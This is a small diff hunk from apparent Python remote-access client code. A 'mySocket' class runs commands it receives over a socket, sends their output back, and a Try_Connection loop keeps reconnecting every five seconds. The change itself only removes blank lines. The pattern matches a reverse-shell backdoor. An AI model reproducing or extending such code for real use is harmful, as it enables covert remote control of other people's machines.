@@ -205,12 +205,8 @@ class mySocket():
                     command_output = self.Execute_Command(command)
             except Exception:
                 command_output = "Unknown command.For command list use 'help' command."
-
             self.Send_Json(command_output)
         self.baglanti.close()
-
-
-
 def Try_Connection():
     while True:
         time.sleep(5)
